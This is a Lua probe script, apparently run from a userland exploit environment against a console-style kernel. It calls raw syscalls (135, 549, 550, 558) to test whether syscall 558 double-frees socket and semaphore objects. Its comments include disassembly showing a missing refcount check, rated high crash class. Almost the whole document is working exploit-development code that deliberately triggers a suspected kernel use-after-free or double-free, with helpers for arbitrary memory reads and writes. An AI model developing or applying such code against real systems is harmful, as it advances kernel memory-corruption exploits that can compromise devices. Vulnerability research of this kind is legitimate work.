-- CRASH_CLASS: HIGH
-- PROBE 867a: sys 558 is a close-shaped destroy with no refcount check
--
-- 13.60 body 0xac73c0: r15=[proc+0xc48]; edx = word[uap+8] | 0x1000; esi=[uap];
-- call 0x8ad5a2a0 (lookup); null -> 3; else 0x8ad59e30 (remove), 0x8ad59eb0,
-- free([rbx]), free(rbx), eax=0.  No refcount test, no destructor call.
-- If the entry survives removal, or two handles name one object, a second call
-- frees again.  Two shapes are tested: our own socketpair ends (we own them, so
-- a successful close costs nothing) and a semaphore id whose type is 0x120.
print("=== PROBE 867a: sys 558 close-shaped destroy on two object classes ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function make_syscall(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=to_num(a) return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local sc = make_syscall
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local rv
local fds = memory.alloc(8); wd(fds,0xFFFFFFFF); wd(fds+4,0xFFFFFFFF)
rv = sc(135)(U(1),U(1),U(0),U(to_num(fds)),U(0),U(0))
local a, b = rd(fds) or -1, rd(fds+4) or -1
print(string.format("[A] socketpair rv=%s fds=%d/%d", tostring(rv), a, b))
if a < 0 then print("[A] no fd"); return end
local function c558(id, w)
    local ok, r = pcall(function() return sc(558)(U(id), U(w), U(0), U(0), U(0), U(0)) end)
    return tostring(ok) .. "/" .. tostring(r)
end
print(string.format("[B] 558(%d,0)   = %s", a, c558(a,0)))
print(string.format("[B] 558(%d,0)   = %s   (second close of the same fd)", a, c558(a,0)))
print(string.format("[B] 558(%d,0)   = %s", a, c558(a,0)))
print(string.format("[C] 558(%d,0)   = %s   (the other end)", b, c558(b,0)))
print(string.format("[C] 558(%d,0)   = %s", b, c558(b,0)))
-- semaphore class: type word 0x120 and the raw word
local name = memory.alloc(0x40); wd(name,0x41); wd(name+4,0)
local okc, id = pcall(function() return sc(549)(U(to_num(name)), U(1), U(0), U(0x1000), U(0), U(0)) end)
local sem = to_num(id)
print(string.format("[D] 549 create ok=%s id=%08X", tostring(okc), sem))
if sem ~= 0 and sem ~= 0xFFFFFFFF then
  if sem > 0x7FFFFFFF then sem = sem - 0x100000000 end
  print(string.format("[D] 558(%08X,0)     = %s", sem, c558(sem,0)))
  print(string.format("[D] 558(%08X,0x120) = %s", sem, c558(sem,0x120)))
  print(string.format("[D] 550(%08X)       = %s", sem, tostring(pcall(function() return sc(550)(U(sem),U(0),U(0),U(0),U(0),U(0)) end))))
end
-- health
local name2 = memory.alloc(0x40); wd(name2,0x42); wd(name2+4,0)
local okh, id2 = pcall(function() return sc(549)(U(to_num(name2)), U(1), U(0), U(0x1000), U(0), U(0)) end)
print(string.format("[Z] health create ok=%s id=%s alive-pid=%s", tostring(okh), tostring(id2),
    tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20)))))
